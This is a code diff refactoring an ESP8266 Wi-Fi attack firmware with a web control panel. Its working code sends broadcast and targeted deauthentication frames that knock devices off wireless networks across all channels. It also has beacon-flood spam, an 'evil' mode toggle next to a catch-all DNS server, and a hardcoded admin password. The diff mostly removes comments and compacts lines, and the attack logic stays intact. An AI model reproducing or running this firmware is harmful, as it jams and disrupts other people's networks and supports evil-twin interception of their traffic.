@@ -4,31 +4,24 @@
 #include <FS.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
-#include "web_index.h" // MEMANGGIL FILE WEB_INDEX.H YANG BARU LO BUAT
+#include "web_index.h"
 
 extern "C" {
   #include "user_interface.h"
 }
 
-// Konfigurasi Layar OLED 0.66"
 Adafruit_SSD1306 display(64, 48, &Wire, -1);
-
 ESP8266WebServer server(80);
 DNSServer dnsServer;
 
-// SETTING ADMIN & STATUS
 String adminSSID = "ADMIN_DASHBOARD";
 String adminPW = "password123";
 bool isMassKill = false, isDeauth = false, isSpam = false, isEvil = false;
+String targetBSSID = "", targetSSID = "";
+int targetCh = 1, currentCh = 1;
 
-String targetBSSID = "";
-int targetCh = 1;
-String targetSSID = "";
-int currentCh = 1;
+uint8_t deauthPkt[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x00,0x00,0x01,0x00};
 
-uint8_t deauthPkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
-
-// FUNGSI CORE (GAK ADA YANG BERUBAH)
 void parseBytes(const char* str, char sep, uint8_t* bytes, int maxBytes, int base) {
     for (int i = 0; i < maxBytes; i++) {
         bytes[i] = strtoul(str, NULL, base);
@@ -41,9 +34,9 @@ void parseBytes(const char* str, char sep, uint8_t* bytes, int maxBytes, int bas
 void sendBeacon(String ssid) {
   uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x00, 0x00, (uint8_t)ssid.length() };
   int pos = 38;
-  for (int i = 0; i < ssid.length(); i++) packet[pos++] = ssid[i];
+  for (int i = 0; i < (int)ssid.length(); i++) packet[pos++] = ssid[i];
   uint8_t post[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)WiFi.channel() };
-  for (int i = 0; i < sizeof(post); i++) packet[pos++] = post[i];
+  for (int i = 0; i < (int)sizeof(post); i++) packet[pos++] = post[i];
   wifi_send_pkt_freedom(packet, pos, 0);
 }
 
@@ -51,47 +44,40 @@ void setup() {
   Serial.begin(115200);
   SPIFFS.begin();
   display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
-  
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(adminSSID.c_str(), adminPW.c_str());
   dnsServer.start(53, "*", WiFi.softAPIP());
 
-  // MENGIRIM HTML DARI WEB_INDEX.H
-  server.on("/", HTTP_GET, [](){ server.send(200, "text/html", INDEX_HTML); });
-  
-  server.on("/scan", HTTP_GET, [](){
+  server.on("/", [](){ server.send(200, "text/html", INDEX_HTML); });
+  server.on("/scan", [](){
     int n = WiFi.scanNetworks(false, true);
-    String json = "[";
-    for (int i = 0; i < n; i++) {
-      json += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(WiFi.RSSI(i))+",\"b\":\""+WiFi.BSSIDstr(i)+"\"}";
-      if (i < n - 1) json += ",";
+    String j = "[";
+    for (int i=0; i<n; i++) {
+      j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"b\":\""+WiFi.BSSIDstr(i)+"\"}";
+      if (i<n-1) j+=",";
     }
-    json += "]";
-    server.send(200, "application/json", json);
+    j += "]"; server.send(200, "application/json", j);
   });
 
-  server.on("/toggle", HTTP_GET, [](){
+  server.on("/toggle", [](){
     String m = server.arg("m");
-    if (m == "kill") isMassKill = !isMassKill;
-    if (m == "deauth") isDeauth = !isDeauth;
-    if (m == "spam") isSpam = !isSpam;
-    if (m == "evil") isEvil = !isEvil;
+    if(m=="kill") isMassKill = !isMassKill;
+    if(m=="deauth") isDeauth = !isDeauth;
+    if(m=="spam") isSpam = !isSpam;
+    if(m=="evil") isEvil = !isEvil;
     server.send(200, "text/plain", "OK");
   });
 
-  server.on("/select", HTTP_GET, [](){
-    targetBSSID = server.arg("b");
-    targetCh = server.arg("c").toInt();
-    targetSSID = server.arg("s");
+  server.on("/select", [](){
+    targetBSSID = server.arg("b"); targetCh = server.arg("c").toInt(); targetSSID = server.arg("s");
     parseBytes(targetBSSID.c_str(), ':', &deauthPkt[10], 6, 16);
     parseBytes(targetBSSID.c_str(), ':', &deauthPkt[16], 6, 16);
     server.send(200, "text/plain", "OK");
   });
 
-  server.on("/config", HTTP_GET, [](){
+  server.on("/config", [](){
     adminSSID = server.arg("s"); adminPW = server.arg("p");
-    server.send(200, "text/plain", "OK");
-    delay(1000); ESP.restart();
+    server.send(200, "text/plain", "OK"); delay(1000); ESP.restart();
   });
 
   server.begin();
@@ -109,7 +95,7 @@ void loop() {
     if (isMassKill) {
       currentCh = (currentCh % 13) + 1;
       wifi_set_channel(currentCh);
-      uint8_t brc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+      uint8_t brc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
       memcpy(&deauthPkt[4], brc, 6);
       for(int i=0; i<3; i++) wifi_send_pkt_freedom(deauthPkt, 26, 0);
     } else if (isDeauth && targetBSSID != "") {
@@ -123,10 +109,8 @@ void loop() {
 
   static unsigned long lastOLED = 0;
   if (now - lastOLED > 1000) {
-    display.clearDisplay();
-    display.setCursor(0,0); display.setTextColor(WHITE);
+    display.clearDisplay(); display.setCursor(0,0); display.setTextColor(WHITE);
     display.printf("KIL:%d DEA:%d\nSPM:%d EVL:%d", isMassKill, isDeauth, isSpam, isEvil);
-    display.display();
-    lastOLED = now;
+    display.display(); lastOLED = now;
   }
 }
